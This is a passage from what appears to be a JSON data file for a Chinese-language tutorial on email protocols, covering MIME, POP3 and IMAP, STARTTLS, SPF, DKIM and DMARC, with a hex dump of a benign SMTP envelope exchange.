位通道，也把附件变成投递通道","p":"SMTP 只能传 7 位 ASCII，图片、可执行文件、中文都过不去。MIME 用两层机制解决：Content-Type 用 type/subtype 声明“这是什么”（text/plain、image/jpeg、application/octet-stream 等），Content-Transfer-Encoding 用 base64 或 quoted-printable 把二进制转成可打印字符；multipart 类型再用 boundary 参数把一封邮件切成多个互相独立的部分，每部分有自己的首部。\n\n这套扩展让“一封邮件里同时有正文和附件”成为常态，也让附件成为恶意代码最主要的投递方式。base64 只是编码不是加密，任何网关都能解码检查；真正的问题在于嵌套 multipart 的解析歧义——网关看到的部分与客户端渲染的部分可以不同，过滤由此被绕过。"},{"h":"POP3 与 IMAP：下载与在线，两种信任模型","p":"POP3 的模型是“下载到本地、本地管理”，早期还会下载后从服务器删除；它的假设是“一台机器、一个用户、拨号上网”。这个假设在今天已不成立：多设备无法同步，且邮件落到本地后不再受服务器侧的策略保护。IMAP 的模型是“邮件留在服务器、在线管理”，用标签化命令支持并发、支持只取首部字段，天然多端同步。\n\n两者共同的缺陷是明文：端口 110 与 143 上的用户名、口令、正文全部可被嗅探。补救只能外挂——POP3S（995）与 IMAPS（993）走隐式 TLS，或在原端口上用 STARTTLS 升级。而 STARTTLS 的软肋在于“前几步是明文”，中间人可以把升级命令剥离掉，让双方退回明文而不自知。"},{"h":"SPF、DKIM、DMARC 各管一段，谁也管不住全部","p":"SPF 在 DNS 里发布一份“哪些 IP 有权代表本域发信”的列表，接收方按信封发件人（MAIL FROM 的域名）查询并核对连接 IP，能挡住直接伪造信封的直接投递。DKIM 用私钥对指定首部与正文摘要签名，公钥放在 DNS 的 selector 记录里，接收方验签即可确认“这封信在签名之后没被改过、且由持私钥者发出”。DMARC 把两者与首部 From 对齐，并告诉接收方“验证失败时该隔离还是拒收”。\n\n三者合起来仍不是认证发件人：SPF 只看 IP 不看内容，转发（forwarding）会破坏它；DKIM 只证明“谁签的”，不证明“谁该签”；DMARC 依赖发件域自己发布策略，未发布的域等于没有。真正的端到端机密性与抗否认要靠 PGP 或 S-MIME——而它们的普及率，恰恰是问题所在。"}],"packets":[{"title":"SMTP 会话字节流：220 就绪 → EHLO → MAIL FROM → RCPT TO → DATA → 354","note":"SMTP 是“人机对话式”的文本协议，命令与应答都以 CRLF 结尾；这里按字节顺序给出会话的前半段（信封阶段）","hex":"32 32 30 20 6d 61 69 6c 2e 62 61 6e 6b 2e 65 78 61 6d 70 6c 65 20 45 53 4d 54 50 20 50 6f 73 74 66 69 78 20 28 55 62 75 6e 74 75 29 0d 0a 45 48 4c 4f 20 63 6c 69 65 6e 74 2e 65 78 61 6d 70 6c 65 0d 0a 32 35 30 2d 6d 61 69 6c 2e 62 61 6e 6b 2e 65 78 61 6d 70 6c 65 0d 0a 32 35 30 2d 53 49 5a 45 20 31 30 32 34 30 30 30 30 0d 0a 32 35 30 2d 38 42 49 54 4d 49 4d 45 0d 0a 4d 41 49 4c 20 46 52 4f 4d 3a 3c 61 6c 69 63 65 40 62 61 6e 6b 2e 65 78 61 6d 70 6c 65 3e 0d 0a 32 35 30 20 32 2e 31 2e 30 20 4f 6b 0d 0a 52 43 50 54 20 54 4f 3a 3c 62 6f 62 40 63 6f 72 70 2e 65 78 61 6d 70 6c 65 3e 0d 0a 32 35 30 20 32 2e 31 2e 35 20 4f 6b 0d 0a
